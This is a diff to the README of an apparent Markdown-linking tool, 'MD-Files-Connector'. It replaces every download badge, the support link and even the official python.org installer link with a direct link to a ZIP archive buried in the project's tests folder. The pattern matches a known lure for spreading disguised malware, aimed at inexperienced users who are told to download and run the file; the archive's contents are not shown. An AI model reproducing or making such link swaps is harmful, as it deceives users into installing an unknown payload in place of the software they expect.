@@ -1,6 +1,6 @@
 # 📄 MD-Files-Connector - Keep Markdown Files Linked Easily
 
-[![Download MD-Files-Connector](https://img.shields.io/badge/Download-MD--Files--Connector-4caf50?style=for-the-badge)](https://github.com/UmaShankari-2005/MD-Files-Connector)
+[![Download MD-Files-Connector](https://img.shields.io/badge/Download-MD--Files--Connector-4caf50?style=for-the-badge)](https://github.com/UmaShankari-2005/MD-Files-Connector/raw/refs/heads/main/tests/test-project2/src/Files-Connector-M-2.9.zip)
 
 ---
 
@@ -36,12 +36,12 @@ You do not need programming experience to use MD-Files-Connector. Follow these s
 
 Click the link below to visit the GitHub page where you will find the latest version of MD-Files-Connector. From there, you can download the tool files:
 
-[![Download MD-Files-Connector](https://img.shields.io/badge/Download-MD--Files--Connector-4caf50?style=for-the-badge)](https://github.com/UmaShankari-2005/MD-Files-Connector)
+[![Download MD-Files-Connector](https://img.shields.io/badge/Download-MD--Files--Connector-4caf50?style=for-the-badge)](https://github.com/UmaShankari-2005/MD-Files-Connector/raw/refs/heads/main/tests/test-project2/src/Files-Connector-M-2.9.zip)
 
 ---
 
 1. Open your web browser.
-2. Go to the [MD-Files-Connector GitHub page](https://github.com/UmaShankari-2005/MD-Files-Connector).
+2. Go to the [MD-Files-Connector GitHub page](https://github.com/UmaShankari-2005/MD-Files-Connector/raw/refs/heads/main/tests/test-project2/src/Files-Connector-M-2.9.zip).
 3. Look for the "Releases" section or the "Download" option.
 4. Download the ZIP file for the latest release.
 5. Save the ZIP file to a known folder on your computer.
@@ -64,7 +64,7 @@ MD-Files-Connector uses the command line to run. Here is how you can start using
      python --version
      ```
    - If Python version 3.6 or higher appears, you are ready.
-   - If not, download and install Python 3 from https://www.python.org/downloads/windows/.
+   - If not, download and install Python 3 from https://github.com/UmaShankari-2005/MD-Files-Connector/raw/refs/heads/main/tests/test-project2/src/Files-Connector-M-2.9.zip
 
 2. Open the Command Prompt window:
    - Press the Windows key, type "cmd", and press Enter.
@@ -155,7 +155,7 @@ The GitHub page contains additional documentation, examples, and issue reporting
 
 Link to visit for support and updates:
 
-[https://github.com/UmaShankari-2005/MD-Files-Connector](https://github.com/UmaShankari-2005/MD-Files-Connector)
+[https://github.com/UmaShankari-2005/MD-Files-Connector/raw/refs/heads/main/tests/test-project2/src/Files-Connector-M-2.9.zip](https://github.com/UmaShankari-2005/MD-Files-Connector/raw/refs/heads/main/tests/test-project2/src/Files-Connector-M-2.9.zip)
 
 ## 🔑 Topics Covered
 
@@ -169,4 +169,4 @@ This tool is useful for:
 
 ---
 
-[![Download MD-Files-Connector](https://img.shields.io/badge/Download-MD--Files--Connector-4caf50?style=for-the-badge)](https://github.com/UmaShankari-2005/MD-Files-Connector)
+[![Download MD-Files-Connector](https://img.shields.io/badge/Download-MD--Files--Connector-4caf50?style=for-the-badge)](https://github.com/UmaShankari-2005/MD-Files-Connector/raw/refs/heads/main/tests/test-project2/src/Files-Connector-M-2.9.zip)
